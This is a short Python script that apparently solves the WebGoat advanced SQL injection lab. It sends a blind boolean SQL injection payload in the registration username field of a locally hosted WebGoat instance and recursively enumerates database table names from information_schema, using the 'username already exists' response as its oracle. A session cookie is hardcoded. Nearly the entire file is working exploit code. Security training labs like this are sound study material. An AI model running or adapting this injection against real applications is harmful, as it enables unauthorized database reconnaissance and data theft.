import json
import requests
discovered_tables = []
def search_db_tables(current_prefix):
    val = 1
    charset = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','$_']
    http_headers = {
        'Cookie': 'JSESSIONID=qcFstFrpPb1Lujrwjxq6j9J4tjdaS87He0UWJYfN',
    }
    sql_injection = 'tom\' and (Select count(table_name) from  information_schema.tables where table_name like \'{}%\' ESCAPE \'$\')> 0;--'.format(current_prefix)
    http_payload = {
        'username_reg': sql_injection,
        'email_reg': 'kvdr@gmail.com',
        'password_reg': '000',
        'confirm_password_reg': '000'
    }
    server_response = requests.put('http://localhost:8080/WebGoat/SqlInjectionAdvanced/challenge', headers=http_headers, data=http_payload)
    try:
        parsed_response = json.loads(server_response.text)
    except:
        print("Incorrect JSESSIONID. Please verify it by checking your requests after logging in.")
        return
    if "already exists please try to register with a different username" in parsed_response['feedback']:
        for char in charset:
            val += search_db_tables(current_prefix + char)
        if(val == 1):
            discovered_tables.append(current_prefix.replace('$', ''))
            print(discovered_tables)
        return 1
    else:
        return 0
search_db_tables('')
print(discovered_tables)
